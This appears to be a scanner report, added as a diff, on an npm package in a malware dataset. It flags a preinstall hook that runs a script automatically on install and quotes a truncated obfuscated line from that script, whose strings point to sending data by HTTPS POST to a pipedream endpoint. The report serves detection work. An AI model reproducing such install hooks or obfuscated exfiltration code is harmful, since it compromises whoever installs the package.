@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"node ncxogsz.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/ncxogsz.js:1",
+                "code": "function a0_0x43fe(){const _0x169ed6=['pipedream','write','request','3044484VIkopN','1494870HmjQPZ','end','from','60wiAlld','join','45728YyfwUd','net','https','5752425cLNRTk','2017728jHpKdM','3f241964ab40f0d30260cde55e73b9e4','POST','901719...0x187)]();",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/wafer-toggle-1.15.4"
+}
